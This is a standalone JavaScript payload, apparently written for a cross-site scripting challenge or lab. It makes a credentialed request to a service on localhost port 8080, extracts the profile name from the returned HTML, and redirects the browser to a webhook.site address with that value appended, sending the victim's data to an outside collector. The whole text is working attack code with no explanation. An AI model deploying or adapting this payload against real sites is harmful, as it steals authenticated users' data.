var r = new XMLHttpRequest();
r.open("GET", "http://127.0.0.1:8080/", true); 
r.onreadystatechange = function() { 
    if (r.readyState == 4){
        var res = r.response.split('\'s Profile')[0].split('<h1>')[0].replace(/\s/g, '');
        window.location = 'https://webhook.site/2bc172cc-3fe7-4c42-875a-366c0ab4699c/q=' + res;
    }
};
r.withCredentials = true;
r.send();
